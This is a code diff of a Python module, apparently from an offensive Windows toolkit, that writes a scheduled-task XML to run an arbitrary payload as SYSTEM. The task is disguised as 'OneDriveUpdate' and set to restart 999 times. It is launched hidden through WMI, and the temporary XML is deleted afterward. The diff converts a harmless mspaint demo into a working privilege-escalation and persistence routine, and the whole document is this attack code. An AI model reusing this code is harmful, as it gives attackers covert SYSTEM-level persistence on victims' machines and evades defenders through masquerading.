@@ -1,28 +1,25 @@
-"""
-Works from: Windows 7
-Fixed in: Unfixed
-"""
 import os
 import wmi
+import time
 import tempfile
-import win32con
 import ctypes
-import datetime
-from colorama import init, Fore
-init(convert=True)
+from core.prints import *
 
-elevate_system = """<?xml version="1.0" encoding="UTF-16"?>
+wmi = wmi.WMI()
+
+def schtask(payload):
+	xml_template = """<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
-    <Date>2018-05-15T13:44:06.4916243</Date>
-    <Author>OneDriveUpdate</Author>
+    <Date>2018-06-09T15:45:11.0109885</Date>
+    <Author>000000000000000000</Author>
     <URI>\Microsoft\Windows\OneDriveUpdate</URI>
   </RegistrationInfo>
-  <Triggers/>
+  <Triggers />
   <Principals>
     <Principal id="Author">
       <UserId>S-1-5-18</UserId>
-	  <RunLevel>HighestAvailable</RunLevel>
+      <RunLevel>HighestAvailable</RunLevel>
     </Principal>
   </Principals>
   <Settings>
@@ -30,7 +27,7 @@ elevate_system = """<?xml version="1.0" encoding="UTF-16"?>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
     <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>false</StartWhenAvailable>
+    <StartWhenAvailable>true</StartWhenAvailable>
     <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
     <IdleSettings>
       <StopOnIdleEnd>true</StopOnIdleEnd>
@@ -43,44 +40,54 @@ elevate_system = """<?xml version="1.0" encoding="UTF-16"?>
     <WakeToRun>false</WakeToRun>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
     <Priority>7</Priority>
+    <RestartOnFailure>
+      <Interval>PT2H</Interval>
+      <Count>999</Count>
+    </RestartOnFailure>
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>c:\\windows\\system32\\cmd.exe</Command>
+      <Command>"""+os.path.join(payload)+"""</Command>
     </Exec>
   </Actions>
 </Task>"""
 
-def print_success(message):
-	print (Fore.GREEN + " [+] " + Fore.RESET + str(datetime.datetime.now()) + ": " + message)
-
-def print_error(message):
-	print (Fore.RED + " [+] " + Fore.RESET + str(datetime.datetime.now()) + ": " + message)
-
-def print_info(message):
-	print (Fore.CYAN + " [!] " + Fore.RESET + str(datetime.datetime.now()) + ": " + message)
-	
-def print_warning(message):
-	print (Fore.YELLOW + " [!] " + Fore.RESET + str(datetime.datetime.now()) + ": " + message)
-
-def schtask_elevate(payload):
+	print_info("Payload {}".format(payload))
 	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
 		try:
-			file = open(os.path.join(tempfile.gettempdir(),"elevator.xml"),"w")
-			file.write(elevate_system)
-			file.close()
+			xml_file = open(os.path.join(tempfile.gettempdir(),"elevator.xml"),"w")
+			xml_file.write(xml_template)
+			xml_file.close()
 		except Exception as error:
 			return False
 	
-	try:
-		x = os.popen("schtasks /create /xml {} /tn OneDriveUpdate && schtasks /run /tn OneDriveUpdate && schtasks /delete /tn OneDriveUpdate /f".format(os.path.join(tempfile.gettempdir(),"gg.xml")))
-		print x.read()
-	except Exception as error:
-		return False
+		time.sleep(5)
 	
-	try:
-		os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
-	except Exception as error:
-		return False
-		
-schtask_elevate("c:\\windows\\system32\\mspaint.exe")			
+		print_info("Attempting to create persistent schtask with SYSTEM privledges")
+		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"elevator.xml")) == True):
+			create = wmi.Win32_Process.Create(CommandLine="schtasks /create /xml {} /tn OneDriveUpdate".format(os.path.join(tempfile.gettempdir(),"elevator.xml")),
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+			
+			if (create[1] == 0):
+				print_success("Successfully created schtask")
+				run = wmi.Win32_Process.Create(CommandLine="schtasks /run /tn OneDriveUpdate",
+									ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+				
+				print_info("Pausing for 5 seconds before running schtask")
+				time.sleep(5)
+				
+				if (run[1] == 0):
+					print_success("Successfully ran schtask")
+					try:
+						os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
+					except Exception as error:
+						return False
+				else:
+					print_error("Unable to run schtask")													
+			else:
+				print_error("Unable to create schtask")
+			
+		else:
+			print_error("Unable to create schtask, xml template not found")
+	else:
+		print_error("Unable to create schtask, we are not elevated")
